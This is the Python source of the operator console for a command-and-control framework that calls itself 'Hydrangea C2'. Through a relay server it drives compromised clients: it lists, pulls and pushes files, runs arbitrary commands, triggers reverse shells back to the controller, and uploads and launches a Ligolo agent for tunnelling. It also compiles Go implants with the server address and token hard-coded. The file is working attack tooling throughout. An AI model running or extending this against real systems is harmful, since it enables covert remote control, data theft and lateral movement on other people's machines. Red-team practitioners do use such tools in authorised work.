#!/usr/bin/env python3

import argparse
import asyncio
import json
import os
import shlex
import sys
import subprocess
from datetime import datetime
from typing import Dict, Optional, Tuple

from utils.common import write_frame, read_frame
from utils.go_builder import build_go_clients
from utils.controller_ui import (
    UI,
    print_error,
    print_queued,
    print_exec,
    print_list,
    print_session,
    print_clients,
    print_server_health,
)

__version__ = "3.0"


# ---------- wire ----------
async def admin_send(
    host: str, port: int, auth_token: str, header: dict, payload: bytes = b""
):
    reader, writer = await asyncio.open_connection(host, port)
    admin_header = {"type": "ADMIN", "token": auth_token}
    admin_header.update(header)
    await write_frame(writer, admin_header, payload)
    resp, resp_payload = await read_frame(reader)
    writer.close()
    await writer.wait_closed()
    return resp, resp_payload


class NoExitArgumentParser(argparse.ArgumentParser):
    def error(self, message):  # don't sys.exit; raise for REPL handling
        raise ValueError(message)


def build_repl_parser() -> Tuple[
    argparse.ArgumentParser, Dict[str, argparse.ArgumentParser]
]:
    p = NoExitArgumentParser(prog=">>")
    sub = p.add_subparsers(dest="cmd")

    # context commands
    sp = sub.add_parser("use", help="Set the active client for subsequent commands")
    sp.add_argument("client", help="Client ID to use")

    sp = sub.add_parser("unuse", help="Clear the active client (or only if it matches)")
    sp.add_argument(
        "client", nargs="?", help="Optional client ID to unuse (must match current)"
    )

    # regular commands (client optional in REPL; will use active context)
    sub.add_parser("clients", help="List connected clients")

    sp = sub.add_parser("ping", help="Ping a client")
    sp.add_argument("--client", required=False)

    sp = sub.add_parser("list", help="List directory on client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--path", default=".")
    sp.add_argument("--wait", action="store_true", help="Wait for result and render")
    sp.add_argument(
        "--timeout", type=float, default=10.0, help="Seconds to wait when --wait"
    )

    sp = sub.add_parser("pull", help="Pull a file from client to server")
    sp.add_argument("--client", required=False)
    sp.add_argument("--src", required=True)
    sp.add_argument("--dest", required=True)

    sp = sub.add_parser("push", help="Push a local file to client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--src", required=True, help="Local path to send")
    sp.add_argument("--dest", required=True, help="Destination path on client")

    sp = sub.add_parser("exec", help="Execute a command on the client")
    sp.add_argument("--client", required=False)
    sp.add_argument(
        "--command",
        required=True,
        help='Command string or JSON list (e.g. "[\\"ls\\",\\"-la\\"]")',
    )
    sp.add_argument("--shell", action="store_true", help="Run via shell")
    sp.add_argument("--cwd", help="Working directory on client")
    sp.add_argument(
        "--timeout", type=float, default=30.0, help="Seconds to wait for command"
    )

    sp = sub.add_parser("session", help="Fetch session info from client")
    sp.add_argument("--client", required=False)
    sp.add_argument("--timeout", type=float, default=1)

    # build-client (REPL)
    sp = sub.add_parser(
        "build-client",
        help="Compile Go clients from ./client/go with hard-coded server details",
    )
    sp.add_argument("--server-host", default=None)
    sp.add_argument("--server-port", type=int, default=None)
    sp.add_argument("--build-auth-token", default=None)
    sp.add_argument("--client-id", default=None)
    sp.add_argument("--out", default="./dist")
    sp.add_argument("--os", action="append", choices=["linux", "windows"])
    sp.add_argument("--arch", default="amd64", choices=["amd64", "arm64"])
    sp.add_argument("--agent-path", default="", help="Path to custom agent source")

    # server-status (REPL)
    sub.add_parser("server-status", help="Check the server's health status")

    # meta
    sub.add_parser("help", help="Show help or 'help <command>'")
    sub.add_parser("quit", help="Exit the console")
    sub.add_parser("exit", help="Exit the console")

    # reverse-shell (REPL)
    sp = sub.add_parser("reverse-shell", help="Start a reverse shell to the controller")
    sp.add_argument("controller_addr", help="Controller address (host:port)")
    sp.add_argument("--client", required=False)

    # port-forward (REPL)
    sp = sub.add_parser(
        "port-forward",
        help="Upload and run Ligolo agent for port forwarding",
    )
    sp.add_argument("--ligolo-path", required=True, help="Path to Ligolo agent binary")
    sp.add_argument(
        "--connect-args",
        required=True,
        help="Arguments passed after --connect, e.g. '127.0.0.1:1000 -slefcert'",
    )
    sp.add_argument("--client", required=False)

    sp = sub.add_parser("local", help="Run a local shell command")
    sp.add_argument("local_command", help="Local command to run")

    # Return also a mapping for subparser lookups (for help display)
    return p, {sp_prog(p): p for p in sub._name_parser_map.values()}


def sp_prog(p: argparse.ArgumentParser) -> str:
    # Retrieve the subparser's program name (command) robustly
    # argparse stores it in .prog; last token is the subcommand
    return p.prog.split()[-1]


# Optional: minimal readline support (history + command completion for verbs)
try:
    import readline  # type: ignore

    def _setup_readline(commands):
        def completer(text, state):
            options = [c for c in commands if c.startswith(text)]
            if state < len(options):
                return options[state]
            return None

        readline.set_completer(completer)
        readline.parse_and_bind("tab: complete")
        histfile = os.path.expanduser("~/.hydrangea_history")
        try:
            readline.read_history_file(histfile)
        except Exception:
            pass
        import atexit

        atexit.register(lambda: _save_history(histfile))

    def _save_history(path):
        try:
            readline.write_history_file(path)
        except Exception:
            pass
except Exception:
    readline = None

    def _setup_readline(_):
        return


# ---------- REPL loop ----------
async def run_repl(args) -> None:
    ui = UI(use_color=(not args.no_color), show_banner=(not args.no_banner), quiet=False)
    ui.welcome(__version__, args.host, args.port)

    repl_parser, sub_map = build_repl_parser()
    commands = sorted([k for k in sub_map.keys() if k not in {"help"}]) + [
        "help", "quit", "exit",
    ]

    current_client: Optional[str] = None
    session_start = datetime.now()
    command_count = 0

    _setup_readline(commands)

    while True:
        try:
            line = ui.prompt(current_client)
        except (EOFError, KeyboardInterrupt):
            ui.goodbye(command_count, session_start)
            return

        if not line or line.startswith("#"):
            continue

        # ---- built-in keywords handled before argparse ----
        if line.lower() in {"help", "?"}:
            ui.help_menu(sub_map)
            continue

        if line.lower().startswith("help "):
            _, _, target_cmd = line.partition(" ")
            sp = sub_map.get(target_cmd.strip())
            if not sp:
                ui.error(f"Unknown command: {target_cmd.strip()}")
            else:
                ui.command_help(target_cmd.strip(), sp)
            continue

        if line.lower() in {"quit", "exit", "ciao", "bisous"}:
            ui.goodbye(command_count, session_start)
            return

        command_count += 1

        # ---- argparse dispatch ----
        try:
            ns = repl_parser.parse_args(shlex.split(line))
        except ValueError as e:
            ui.error(str(e))
            continue
        except SystemExit:
            continue

        cmd = getattr(ns, "cmd", None)
        if not cmd:
            ui.error("No command parsed. Type 'help'.")
            continue

        # helper: resolve target client from flag or active context
        def _resolve_client(flag_value: Optional[str]) -> Optional[str]:
            return flag_value or current_client

        # ---- context ----
        if cmd == "use":
            prev = current_client
            current_client = ns.client.strip()
            ui.show_client_switch(prev, current_client)
            continue

        if cmd == "unuse":
            if ns.client and current_client and ns.client != current_client:
                ui.info(
                    f"Active client is {ui.c(current_client, 'cyan')}; "
                    f"did not clear {ui.c(ns.client, 'dim')}"
                )
                continue
            ui.show_client_clear(current_client)
            current_client = None
            continue

        # ---- fleet ----
        if cmd == "clients":
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token, {"action": "clients"}
            )
            if resp.get("type") == "CLIENTS":
                print_clients(ui, resp.get("clients", []))
            else:
                print_error(ui, resp)
            continue

        if cmd == "ping":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token,
                {"action": "ping", "target_id": target},
            )
            if resp.get("type") == "OK":
                ui.success(f"Ping sent to {ui.c(target, 'cyan')}")
            else:
                print_error(ui, resp)
            continue

        # ---- files ----
        if cmd == "list":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            resp, payload = await admin_send(
                args.host, args.port, args.auth_token,
                {
                    "action": "list",
                    "target_id": target,
                    "path": ns.path,
                    "wait": ns.wait,
                    "timeout": ns.timeout,
                },
            )
            if ns.wait:
                print_list(ui, ns.path, resp, payload)
            else:
                print_queued(ui, resp)
            continue

        if cmd == "pull":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token,
                {"action": "pull", "target_id": target, "src": ns.src, "dest": ns.dest},
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
                ui.info(f"File will arrive in server storage once the client responds.")
            else:
                print_error(ui, resp)
            continue

        if cmd == "push":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            if not os.path.isfile(ns.src):
                ui.error(f"Local file not found: {ns.src}")
                continue
            try:
                with open(ns.src, "rb") as f:
                    data = f.read()
            except Exception as e:
                ui.error(f"Cannot read {ns.src}: {e}")
                continue
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token,
                {
                    "action": "push",
                    "target_id": target,
                    "dest": ns.dest,
                    "src_name": os.path.basename(ns.src),
                },
                data,
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
            else:
                print_error(ui, resp)
            continue

        # ---- execution ----
        if cmd == "exec":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            cmd_value = ns.command
            try:
                cmd_value = json.loads(cmd_value)
            except Exception:
                pass
            resp, payload = await admin_send(
                args.host, args.port, args.auth_token,
                {
                    "action": "exec",
                    "target_id": target,
                    "cmd": cmd_value,
                    "shell": ns.shell,
                    "cwd": ns.cwd,
                    "timeout": ns.timeout,
                },
            )
            print_exec(ui, target, resp, payload)
            continue

        if cmd == "session":
            target = _resolve_client(ns.client)
            if not target:
                ui.show_no_client_error()
                continue
            resp, payload = await admin_send(
                args.host, args.port, args.auth_token,
                {"action": "session_info", "target_id": target, "timeout": ns.timeout},
            )
            print_session(ui, target, resp, payload)
            continue

        if cmd == "reverse-shell":
            target = _resolve_client(getattr(ns, "client", None))
            if not target:
                ui.show_no_client_error()
                continue
            ui.info(
                f"Start your listener on {ui.c(ns.controller_addr, 'cyan')} "
                f"before sending — client will dial immediately."
            )
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token,
                {
                    "action": "reverse_shell",
                    "target_id": target,
                    "controller_addr": ns.controller_addr,
                },
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
            else:
                print_error(ui, resp)
            continue

        if cmd == "port-forward":
            target = _resolve_client(getattr(ns, "client", None))
            if not target:
                ui.show_no_client_error()
                continue
            if not os.path.isfile(ns.ligolo_path):
                ui.error(f"Ligolo binary not found: {ns.ligolo_path}")
                continue
            try:
                with open(ns.ligolo_path, "rb") as f:
                    payload = f.read()
            except Exception as e:
                ui.error(f"Cannot read binary: {e}")
                continue
            filename = os.path.basename(ns.ligolo_path)
            # Step 1: upload
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token,
                {"action": "push", "target_id": target, "dest": filename, "src_name": filename},
                payload,
            )
            if resp.get("type") != "QUEUED":
                print_error(ui, resp)
                continue
            ui.info(f"Upload queued: {ui.c(filename, 'cyan')} -> {ui.c(target, 'cyan')}")
            # Step 2: run
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token,
                {
                    "action": "port_forward",
                    "target_id": target,
                    "filename": filename,
                    "connect_args": ns.connect_args,
                },
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
            else:
                print_error(ui, resp)
            continue

        # ---- build ----
        if cmd == "build-client":
            if ns.server_host is None:
                ns.server_host = args.host
            if ns.server_port is None:
                ns.server_port = args.port
            if ns.build_auth_token is None:
                ns.build_auth_token = args.auth_token
            ui.build_summary(ns)
            try:
                build_go_clients(ui, ns, ns.agent_path)
            except Exception as e:
                ui.error(f"Build failed: {e}")
            continue

        # ---- server / local ----
        if cmd == "server-status":
            resp, _ = await admin_send(
                args.host, args.port, args.auth_token, {"action": "health_status"}
            )
            print_server_health(ui, resp)
            continue

        if cmd == "local":
            try:
                proc = subprocess.Popen(ns.local_command, shell=True)
                ui.info(f"PID {proc.pid}  running: {ui.c(ns.local_command, 'dim')}")
                try:
                    proc.wait(timeout=300)
                    ui.success(f"exit {proc.returncode}")
                except subprocess.TimeoutExpired:
                    proc.kill()
                    ui.error("Timed out after 5 min — process killed.")
                except KeyboardInterrupt:
                    proc.terminate()
                    ui.info("Interrupted.")
            except Exception as e:
                ui.error(f"Failed to start: {e}")
            continue

        ui.error(f"Unknown command: {cmd}  (type 'help')")


def start_server(args):
    ui = UI(use_color=(not args.no_color), show_banner=False, quiet=args.quiet)
    ui.rule(" start server ")
    ui.kv("Host", args.host)
    ui.kv("Port", args.port)
    ui.rule()
    cmd = [
        sys.executable,
        "Hydrangea-server.py",
        "--host", args.host,
        "--ports", str(args.port),   # server uses --ports (plural)
        "--auth-token", args.auth_token,
    ]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ui.success(f"Server process started (PID {proc.pid})")
    except Exception as e:
        ui.error(f"Failed to start server: {e}")
    ui.rule()


# ---------- CLI ----------


async def main():
    ap = argparse.ArgumentParser(description="Hydrangea C2 controller")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--auth-token", required=True)
    ap.add_argument(
        "--start-srv", action="store_true", help="Start server with given parameters"
    )

    # UI flags
    ap.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    ap.add_argument("--no-banner", action="store_true", help="Hide ASCII banner")
    ap.add_argument("--quiet", action="store_true", help="Less chatter")
    args = ap.parse_args()

    if args.start_srv:
        start_server(args)

    await run_repl(args)


if __name__ == "__main__":
    asyncio.run(main())
